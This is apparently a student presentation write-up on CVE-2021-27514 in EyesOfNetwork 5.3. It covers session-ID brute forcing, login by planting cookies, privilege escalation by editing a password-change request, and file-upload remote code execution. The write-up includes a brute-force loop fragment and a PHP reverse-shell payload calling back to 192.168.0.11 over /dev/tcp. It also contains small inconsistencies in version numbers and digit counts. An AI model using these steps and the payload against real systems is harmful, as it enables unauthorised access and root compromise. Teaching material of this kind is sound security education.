# (CVE-2021-27514) **Authentication bypass with SessionID brute forcing**

## What software contains the vulnerability?
The vulnerability is found in version 5.3 of a program called EyesofNetwork.
## What is the vulnerability?
The program allows the sessionID to be brute-forced without an eventual timeout or cooldown to prevent excessive authentication attempts. To make brute-forcing even easier, the SessionID is ALWAYS between 8-10 numerical digits in length.

## What is EyesofNetwork?
Eyes of Network is a program designed to assist in the management of an information system. The software is designed to make use of the IT Infrastructure library process and pair it with a GUI in order to allow businesses to manage their networks, applications, commerce, data, updates, and monitor their business statistics.
## When was the exploit discovered?
**February 21st 2021**
## When was the exploit patched?
**March 12th 2021**
## How was it fixed?
The patch changed the table structure and changed the sessionID from 8-10 numerical digits to a higher number of alphanumeric char values.

## What is Brute-forcing?    
-   Brute forcing is when an attacker uses some sort of semi or fully automated program in order to try several entries until the desired value for the situation at hand is found. The method is most commonly used to obtain a password or in our case a sessionID

- Brute forcing can work in 3 main ways:
	- The program can try random values within parameters
	
	- The program can try to check values from a word list like what we all did in this very class if you used a brute force style program for assignment 4 like john the ripper
	- Or lastly or what we will demonstrate today they can follow a continuous pattern or increment value

## What is a sessionID?
-   A sessionID is a unique identifier assigned to a user upon login and represents the open session. The SessionID essentially tells the program that the system logged in is being used by the user associated with the ID.
    
-   The sessionId which was mentioned thought the presentation is the main point of concern for this vulnerability as it was too short with too low of a complexity
    
-   It is commonly accepted that most session IDs should be a minimum of 128 bits in length in order to combat the aforementioned brute force attacks.
#  How the Exploit Works
The Eyes of Network has a vulnerability in version 5.10 that has a session ID between 8 and 10 digits. This is done using a brute force method, meaning that you would start searching using session ID 10000000 and iterate up to 9999999999. This can be seen in this code: 

```python
    if rep.content.find(bytes) !=-1:
        a = int(a) + 1
        if int(a) == 99999999999:
            print("No Session_id available ... ")
            break
    else:
        print ("Yepa !")
        print("")
        print('\x1b[6;30;42m' + '[+] session_id FOUND ! '  + a + '\x1b[0m')
        print("")
        break
```
Where rep.content is the response from a GET request using the current iteration of the session ID. From here there are many different exploits available and we ran through the following ones to test these vulnerabilities: 

## Eyes of Network Access without Credentials 
Logging in using the obtained session ID is fairly straight forward. The following image is using the developer tools built into google chrome, you can navigate to the application tab and click on cookies:
![image](https://user-images.githubusercontent.com/71412992/112726764-838b2c80-8ef5-11eb-84cb-9cee09076cd6.png)

You will need to fill in all of these fields and put in the session ID that was obtained. The other fields are filled out based on the type of user the session ID belongs too. This would require trial and error or some inside knowledge of how Eyes of Network user information. 

Once the fields are filled out properly, you refresh the cookies and then the page and you will now be on the main dashboard page of the site with the same access as the user whos session ID you used. 

## Privilege Escalation 
This exploit involves allowing a restricted user to gain access to an admin account. Once a user has logged in, (This can be done using the session ID or with real credentials if the user has access to the site) this user will navigate to the profile tab on the eyes of network portal. Once here they have to option to change their password. The put in and password they would like. 

Next using a proxy interrupter, they interrupt the POST request to change the password:

![image](https://user-images.githubusercontent.com/71412992/112727172-8424c280-8ef7-11eb-8abf-9956d3f645e6.png)

Using the Admin session ID, user_name,user_id, group_id the user is able to change the password of the admin immediately and now has access to that account through regular log in. 

## Root Access to Eyes of Network OS (CentOS)
The last vulnerability that we explored with this exploit was gaining root access on the Eyes of Network operating system. This vulnerability could result in massive loss of data and destruction.  The following code will POST a .php file disguised as a .XML file to a directory on system. A GET request is then called on that file which will cause it to execute: 

```python
postreq=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, verify=False)
rep2=postreq

...

requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, verify=False)

```
The php file will give a specified IP and Port interactive rights to the OS: 

```
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.0.11/9999 0>&1'");
```
Here we can see that the file has been successfully uploaded 

![image](https://user-images.githubusercontent.com/71412992/112731199-3fefed00-8f0c-11eb-8485-9e4b1914000c.png)

During the time the code is running you will listen on the port specified in the code (on the machine that with the specified IP). Once the GET request is run you will be logged in as a user. 
Moving to the /tmp directory you are then able to do a os.execute in order to escape interpreters and gain root access. This can all be seen here: 
![image](https://user-images.githubusercontent.com/71412992/112731497-f7393380-8f0d-11eb-932d-c97a413d1e6a.png)

It should be noted that the ITSM module needs to be installed on Eyes of Network for this portion of the explot to work as this is what allows XML upload. 


## References 

[1] Eyes of Network website https://www.eyesofnetwork.com/en

[2] Exploit Guide and walkthrough  https://ariane.agency/site/index.php/2021/02/23/quand-tu-trouves-une-0day-pendant-un-audit-d/

[3] Explot repository https://github.com/ArianeBlow/exploit-eyesofnetwork5.3.10/blob/main/PoC-BruteForceID-arbitraty-file-upload-RCE-PrivEsc.py

[4] Eyes of Network Community Discussion https://github.com/EyesOfNetworkCommunity/eonweb/issues/87

[5] Eyes of Network Eonweb repository for ITSM https://github.com/EyesOfNetworkCommunity/eonweb

[6] Linux preivileges https://guif.re/linuxeop

[7] Exploit Fix https://github.com/EyesOfNetworkCommunity/eonweb/commit/6d1be13ba36fedfc8cdcbe9c30e99d4e0ca7db1b?fbclid=IwAR0X3qOSDuq1Ke_uAHDjKriPMAfSDWhi4IU6QZWKTuo-Zj4R1sV_TG7hPTo#

[8] NIST Vulnerbility https://nvd.nist.gov/vuln/detail/CVE-2021-27514

[9] SessionID Length https://owasp.org/www-community/vulnerabilities/Insufficient_Session-ID_Length#:~:text=Description,brute%2Dforce%20session%20guessing%20attacks.


